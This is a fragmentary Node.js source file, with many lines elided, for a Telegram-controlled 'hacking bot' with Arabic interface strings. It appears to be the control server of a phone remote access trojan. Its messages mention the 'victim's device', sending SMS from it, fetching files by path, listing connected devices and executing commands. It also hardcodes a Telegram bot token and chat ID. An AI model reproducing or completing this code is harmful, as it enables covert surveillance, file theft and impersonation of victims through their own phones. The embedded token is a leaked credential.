...
const token = '8446664534:AAEJNHVz3fcgCjL-K8UOipgJJxgPwnjO1jM'
const id = '7757061458'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت :صــ𓅓𝑺𝑨𝑸𝑬𝑹𓅓ــقــࢪ 𖤛ᴠɪᴘ  : @OX_U1</h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور صــ𓅓𝑺𝑨𝑸𝑬𝑹𓅓ــقــࢪ 𖤛ᴠɪᴘ : @OX_U1 ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
        ...
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
            ...
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة صــ𓅓𝑺𝑨𝑸𝑬𝑹𓅓ــقــࢪ 𖤛ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق  البوت𖤛ᴠɪᴘ مطور صــ𓅓𝑺𝑨𝑸𝑬𝑹𓅓ــقــࢪ𓆪 : @OX_U1\n\n' +
                '•   ، \n\n' +
